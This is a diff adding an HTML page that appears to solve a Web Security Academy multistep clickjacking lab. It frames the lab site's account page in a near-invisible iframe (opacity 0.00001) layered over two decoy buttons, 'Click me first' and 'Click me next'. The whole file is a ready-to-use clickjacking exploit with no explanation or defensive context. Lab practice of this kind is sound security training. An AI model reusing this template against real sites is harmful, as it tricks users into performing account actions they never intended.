@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        #target_site {
+            position: relative;
+            width: 100%;
+            height: 700px;
+            opacity: 0.00001;
+            z-index: 2;
+        }
+        
+        #click1 {
+            position: absolute;
+            top: 100px;
+            left: 100px;
+            z-index: 1;
+            background: #ff4444;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+        }
+        
+        #click2 {
+            position: absolute;
+            top: 200px;
+            left: 100px;
+            z-index: 1;
+            background: #4444ff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <button id="click1">Click me first</button>
+    <button id="click2">Click me next</button>
+    <iframe id="target_site" src="https://0a1500080453711983606a59001f00fa.web-security-academy.net/my-account"></iframe>
+</body>
+</html>
